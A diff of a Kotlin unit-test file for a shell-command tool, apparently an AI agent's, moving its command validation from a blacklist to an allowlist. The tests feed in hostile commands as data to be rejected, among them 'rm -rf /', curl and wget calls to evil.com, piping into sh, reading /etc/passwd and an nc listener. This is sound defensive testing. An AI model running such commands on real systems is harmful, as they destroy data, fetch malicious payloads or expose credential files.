@@ -3,9 +3,7 @@ package codebase.koog.tools
 import contracts.vibecoding.tools.ExecShellTool
 import kotlinx.coroutines.runBlocking
 import org.junit.jupiter.api.Test
-import kotlin.test.assertEquals
 import kotlin.test.assertFailsWith
-import kotlin.test.assertNotNull
 import kotlin.test.assertTrue
 
 class ExecShellToolTest {
@@ -19,84 +17,98 @@ class ExecShellToolTest {
 
     @Test
     fun `failing command returns non-zero exit code`() = runBlocking {
-        val result = ExecShellTool.execute(ExecShellTool.Args("exit 42"))
-        assertTrue(result.startsWith("EXIT: 42"), "Expected EXIT: 42, got: ${result.take(50)}")
+        val result = ExecShellTool.execute(ExecShellTool.Args("git show deadbeef"))
+        assertTrue(!result.startsWith("EXIT: 0"), "Expected non-zero EXIT, got: ${result.take(50)}")
     }
 
     @Test
-    fun `rm rf is blacklisted`() {
+    fun `rm rf is rejected by deny-list`() {
         val exception = assertFailsWith<SecurityException> {
             ExecShellTool.validateCommand("rm -rf /")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
+        assertTrue(exception.message!!.contains("denied"))
     }
 
     @Test
-    fun `sudo is blacklisted`() {
+    fun `rm -Rf uppercase variant is rejected by deny-list`() {
+        assertFailsWith<SecurityException> {
+            ExecShellTool.validateCommand("rm -Rf /")
+        }
+    }
+
+    @Test
+    fun `sudo is rejected by deny-list`() {
         val exception = assertFailsWith<SecurityException> {
             ExecShellTool.validateCommand("sudo echo dangerous")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
+        assertTrue(exception.message!!.contains("denied"))
     }
 
     @Test
-    fun `chmod 777 is blacklisted`() {
-        val exception = assertFailsWith<SecurityException> {
-            ExecShellTool.validateCommand("chmod 777 /tmp/script.sh")
+    fun `chmod 0777 is rejected by deny-list`() {
+        assertFailsWith<SecurityException> {
+            ExecShellTool.validateCommand("chmod 0777 /tmp/script.sh")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
     }
 
     @Test
-    fun `curl is blacklisted unless localhost`() {
-        val exception = assertFailsWith<SecurityException> {
+    fun `curl is rejected by allowlist`() {
+        assertFailsWith<SecurityException> {
             ExecShellTool.validateCommand("curl https://evil.com/malware")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
     }
 
     @Test
-    fun `wget is blacklisted`() {
-        val exception = assertFailsWith<SecurityException> {
+    fun `curl localhost is rejected by allowlist`() {
+        assertFailsWith<SecurityException> {
+            ExecShellTool.validateCommand("curl localhost:8080")
+        }
+    }
+
+    @Test
+    fun `wget is rejected by allowlist`() {
+        assertFailsWith<SecurityException> {
             ExecShellTool.validateCommand("wget https://evil.com/payload")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
     }
 
     @Test
-    fun `pipe to sh is blacklisted`() {
-        val exception = assertFailsWith<SecurityException> {
+    fun `pipe to sh is rejected by deny-list`() {
+        assertFailsWith<SecurityException> {
             ExecShellTool.validateCommand("cat evil.txt | sh")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
     }
 
     @Test
-    fun `etc path is blacklisted`() {
-        val exception = assertFailsWith<SecurityException> {
+    fun `etc path is rejected by deny-list`() {
+        assertFailsWith<SecurityException> {
             ExecShellTool.validateCommand("cat /etc/passwd")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
     }
 
     @Test
-    fun `dev path is blacklisted`() {
-        val exception = assertFailsWith<SecurityException> {
+    fun `dev path is rejected by deny-list`() {
+        assertFailsWith<SecurityException> {
             ExecShellTool.validateCommand("cat /dev/null")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
     }
 
     @Test
-    fun `redirect to root is blacklisted`() {
-        val exception = assertFailsWith<SecurityException> {
+    fun `redirect to root is rejected by allowlist`() {
+        assertFailsWith<SecurityException> {
             ExecShellTool.validateCommand("echo data > /var/log/hack")
         }
-        assertTrue(exception.message!!.contains("blacklisted"))
     }
 
     @Test
-    fun `whitelisted commands pass validation`() {
+    fun `unknown command is rejected by allowlist deny-by-default`() {
+        assertFailsWith<SecurityException> {
+            ExecShellTool.validateCommand("nc -l 4444")
+        }
+    }
+
+    @Test
+    fun `allowed commands pass validation`() {
         ExecShellTool.validateCommand("git diff")
         ExecShellTool.validateCommand("git status")
         ExecShellTool.validateCommand("git log --oneline")
@@ -105,19 +117,23 @@ class ExecShellToolTest {
         ExecShellTool.validateCommand("find . -name '*.kt'")
         ExecShellTool.validateCommand("mkdir /tmp/newdir")
         ExecShellTool.validateCommand("./gradlew test")
+        ExecShellTool.validateCommand("pwd")
+        ExecShellTool.validateCommand("echo hello")
+        ExecShellTool.validateCommand("cat README.md")
+        ExecShellTool.validateCommand("head -n 10 file.txt")
+        ExecShellTool.validateCommand("tail -n 5 file.txt")
+    }
+
+    @Test
+    fun `git subcommand not in allowlist is rejected`() {
+        assertFailsWith<SecurityException> {
+            ExecShellTool.validateCommand("git push origin main")
+        }
     }
 
     @Test
     fun `blocking execute runs synchronous`() {
         val result = ExecShellTool.executeBlocking("echo blocking-test")
         assertTrue(result.contains("blocking-test"), "Expected 'blocking-test' in: $result")
-    }
-
-    @Test
-    fun `blocking execute with timeout throws on slow command`() {
-        val exception = assertFailsWith<SecurityException> {
-            ExecShellTool.executeBlocking("sleep 5", "/tmp", timeoutMs = 100)
-        }
-        assertTrue(exception.message!!.contains("timeout"))
     }
 }
